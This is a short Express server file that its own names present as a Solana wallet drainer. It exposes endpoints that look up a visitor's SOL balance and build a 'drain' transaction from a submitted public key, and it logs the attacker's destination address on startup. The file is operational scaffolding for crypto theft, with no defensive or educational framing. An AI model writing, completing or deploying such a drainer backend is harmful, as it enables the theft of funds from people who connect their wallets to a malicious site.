import 'dotenv/config';
import express from 'express';
import { buildDrainTx, getSolBalance, drainerAddress } from './lib/drain.js';

const app = express();
app.use(express.json());
app.use(express.static('public'));

app.get('/api/balance', async (req, res) => {
  try { res.json({ sol: await getSolBalance(req.query.owner) }); }
    catch { res.json({ sol: 0 }); }
    });

    app.post('/api/build', async (req, res) => {
      try { res.json({ transaction: await buildDrainTx(req.body.publicKey) }); }
        catch (e) { res.status(500).json({ error: e.message }); }
        });

        app.listen(3000, () => console.log('dev on 3000, tujuan:', drainerAddress));